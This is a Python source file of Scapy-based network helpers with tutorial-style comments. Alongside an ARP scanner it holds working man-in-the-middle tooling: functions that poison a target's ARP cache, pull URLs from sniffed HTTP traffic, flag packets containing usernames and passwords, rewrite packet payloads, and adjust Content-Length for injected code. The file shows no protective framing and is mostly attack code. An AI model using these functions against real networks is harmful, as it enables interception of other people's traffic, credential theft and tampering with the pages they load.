# star(*) means we want to import import everything from scapy.all library
from scapy.all import *
from scapy.layers import http
"""
Scapy is about manipulating networking packets. 
You must have a bit of knowlege about OSI Model and TCP/IP Model to be able to use scapy at its full potential.
"""

# To check if the target IP is live or not. If IP is up, prints the MAC Address
def scan(IP):
	""" 
	Create a source packet with srp(). We use '/' for stacking different Layers of OSI Model.
	In this case, we are stacking (Ether from) Data Link Layer and (ARP from) Network Layer.
	Then we send the packet to broadbast ip address(ff:ff:ff:ff:ff:ff) through Ether(net).
	We stack the ARP Packet to get the MAC Address of the target IP Address.
	The broadcast IP address then asks EVERY SINGLE DEVICE with ARP packet, "Who Has the target IP Address?".
	The one with target IP address replies with ARP packet saying "I have the target IP Address 
	 and my MAC address is this." The broadcast IP address then gives us the MAC of the target.

	dst represents destination and pdst represents packet destination.
	verbose=False to prevent scapy from displaying detailed information.
	timeout=1 means we will wait 1 second for a reply from broadcast.

  	srp() returns answered and unanswered list. srp()[0] for accessing answered list only
	"""
	ans_list = srp(Ether(dst="ff:ff:ff:ff:ff:ff")/ARP(pdst=IP), timeout=1, verbose=False)[0]
	clients_list = []
	for QueryAnswer in ans_list:
		"""
		psrc for packet source and hwsrc for MAC Address source.
		QueryAnswer has both query and answer.
		QueryAnswer[1] because index 0 is our query and index 1 is the answer.
		"""
		client_dict = {'IP' : QueryAnswer[1].psrc, 'MAC' : QueryAnswer[1].hwsrc}
		clients_list.append(client_dict)
	return clients_list

def get_mac(IP):
	# sr() or srp() returns answered and unanswered lists
	ans_list = srp(Ether(dst="ff:ff:ff:ff:ff:ff")/ARP(pdst=IP), timeout=1, verbose=False)[0]
	if len(ans_list) > 0:
		return ans_list[0][1].hwsrc
	else:
		print(f"Waiting for MAC of {IP} ...")
		time.sleep(1)
		return get_mac(IP)

def get_ip(network, MAC):
	clients_list = scan(network)
	for client in clients_list:
		if MAC == client['MAC']:
			return client['IP']

def spoof(target_ip, spoofed_ip):
	target_mac = get_mac(target_ip)
	pkt = ARP(op=2, pdst=target_ip, hwdst=target_mac, psrc=spoofed_ip)
	send(pkt, verbose=False)

def restore(target_ip, spoofed_ip):
	target_mac = get_mac(target_ip)
	spoofed_mac = get_mac(spoofed_ip)
	pkt = ARP(op=2, pdst=target_ip, hwdst=target_mac, psrc=spoofed_ip, hwsrc=spoofed_mac)
	send(pkt, count=4, verbose=False)

def get_url(pkt):
	if pkt.haslayer(http.HTTPRequest):
		return pkt[http.HTTPRequest].Host + pkt[http.HTTPRequest].Path

def get_login_info(pkt):
	if pkt.haslayer(Raw):
		load = pkt['Raw'].load
		keywords = ['username', 'user', 'login', 'password', 'pass']
		for keyword in keywords:
			if keyword.encode() in load:
				return load

def set_load(pkt, load):
	pkt[Raw].load = load
	del pkt[IP].len
	del pkt[IP].chksum
	del pkt[TCP].chksum
	return pkt

def modify_content_length(load):
	content_length_search = re.search(r"(?:Content-Length:\s)(\d*)", load)
	if content_length_search and "text/html" in load:
		content_length = content_length_search.group(1)
		new_content_length = int(content_length) + len(code_inject)
		load = load.replace(content_length, str(new_content_length))
	return load
